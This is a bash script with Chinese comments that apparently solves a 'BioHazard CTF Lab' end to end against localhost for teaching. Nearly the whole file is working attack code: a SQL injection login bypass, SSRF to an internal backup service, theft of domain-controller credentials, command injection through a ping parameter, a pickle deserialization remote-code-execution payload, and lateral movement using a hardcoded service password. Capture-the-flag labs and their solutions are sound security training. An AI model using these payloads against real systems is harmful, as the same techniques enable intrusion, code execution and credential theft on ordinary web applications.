#!/usr/bin/env bash
# ============================================================
# BioHazard CTF Lab — 一键通关脚本 (教学演示用)
#   用法: bash scripts/attacker.sh [目标地址]
#   默认目标: http://localhost
#   需要: curl
# ============================================================
set -u
TARGET="${1:-http://localhost}"
BACKUP="$TARGET/api/fetch?url="
DC_PORT="${DC_PORT:-389}"
BACKUP_PORT="${BACKUP_PORT:-8080}"
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'

say()  { echo -e "${GREEN}[*]${NC} $1"; }
flag() { echo -e "${YELLOW}🏁 $1${NC}"; echo; }
err()  { echo -e "${RED}[!]${NC} $1"; }

echo "======================================================"
echo " BioHazard CTF Lab — 攻击链演示"
echo " 目标: $TARGET"
echo "======================================================"

# ---------- 关卡1: 信息收集 ----------
say "关卡1 信息收集: 探测开放端口/目录"
curl -s -o /dev/null -w "  首页 HTTP %{http_code}\n" "$TARGET/"
say "  读取 robots.txt"
curl -s "$TARGET/robots.txt" | sed 's/^/    /'
say "  [秘籍] 直接访问调试接口 /debug_info"
info=$(curl -s "$TARGET/debug_info")
echo "$info" | python3 -m json.tool | sed 's/^/    /'
flag "获得 flag#1: $(echo "$info" | python3 -c 'import sys,json;print(json.load(sys.stdin)["flag1"])')"
echo "$info" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(f"    内网线索: MySQL={d[\"mysql_host\"]}  网段={d[\"internal_subnet\"]}")'

# ---------- 关卡2: SQL 注入 + 后台 ----------
say "关卡2 SQL注入绕过登录: 用户名输入 ' OR '1'='1' -- "
cookie_jar=$(mktemp)
curl -s -c "$cookie_jar" -b "$cookie_jar" -X POST "$TARGET/login" \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=x" -o /dev/null -w "    登录响应 HTTP %{http_code}\n"
say "  带着伪造会话访问后台 /admin"
admin=$(curl -s -b "$cookie_jar" "$TARGET/admin")
flag2=$(echo "$admin" | grep -oE 'flag\{[^}]+\}' || echo "未获取到(可能登录失败)")
flag "获得 flag#2: $flag2"

# ---------- 关卡3: 源码泄露 -> 弱密钥 ----------
say "关卡3 源码泄露: 查看 /source 找到硬编码 SECRET_KEY"
curl -s "$TARGET/source" | grep -n "SECRET_KEY" | sed 's/^/    /' | head -3
say "  枚举路由: /api/routes"
curl -s "$TARGET/api/routes" | python3 -c 'import sys,json;print("    "+"  ".join(json.load(sys.stdin)["routes"]))'

# ---------- 关卡4: SSRF -> 内网 backup ----------
say "关卡4 SSRF: 通过 /api/fetch 访问内网 backup 服务"
curl -s "${BACKUP}http://backup:${BACKUP_PORT}/" | sed 's/^/    /'
say "  读取核心备份 (flag#3)"
curl -s "${BACKUP}http://backup:${BACKUP_PORT}/archives/core_backup.txt" | sed 's/^/    /'
curl -s "${BACKUP}http://backup:${BACKUP_PORT}/archives/core_backup.txt" | grep -oE 'flag\{[^}]+\}' | sed 's/^/🏁 /'
flag "获得 flag#3: $(curl -s "${BACKUP}http://backup:${BACKUP_PORT}/archives/core_backup.txt" | grep -oE 'flag\{[^}]+\}')"
say "  窃取域控服务账号"
curl -s "${BACKUP}http://backup:${BACKUP_PORT}/secrets/dc_creds.txt" | sed 's/^/    /'

# ---------- 关卡5: 命令注入 ----------
say "关卡5 命令注入: /api/ping 拼接执行"
curl -s "$TARGET/api/ping?ip=127.0.0.1%3Bid" | head -5 | sed 's/^/    /'

# ---------- 关卡6: pickle 反序列化 RCE ----------
say "关卡6 pickle 反序列化: 构造 payload 执行命令"
PAYLOAD=$(python3 - <<'EOF'
import pickle, base64, subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))
print(base64.b64encode(pickle.dumps(RCE())).decode())
EOF
)
curl -s -X POST "$TARGET/api/deserialize" --data-urlencode "data=$PAYLOAD" | sed 's/^/    /'

# ---------- 关卡7: 内网横向移动 -> 域控 ----------
say "关卡7 横向移动: 用偷到的域控账号认证 dc"
dc_flag=$(curl -s "${BACKUP}http://dc:${DC_PORT}/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026")
echo "$dc_flag" | sed 's/^/    /'
flag "获得 flag#4 (域控): $(echo "$dc_flag" | grep -oE 'flag\{[^}]+\}')"

echo "======================================================"
say "全部 flag 收集完毕! 恭喜通关 🎉"
say "再次提醒: 以上全部操作只允许在本地靶场进行"
echo "======================================================"
rm -f "$cookie_jar"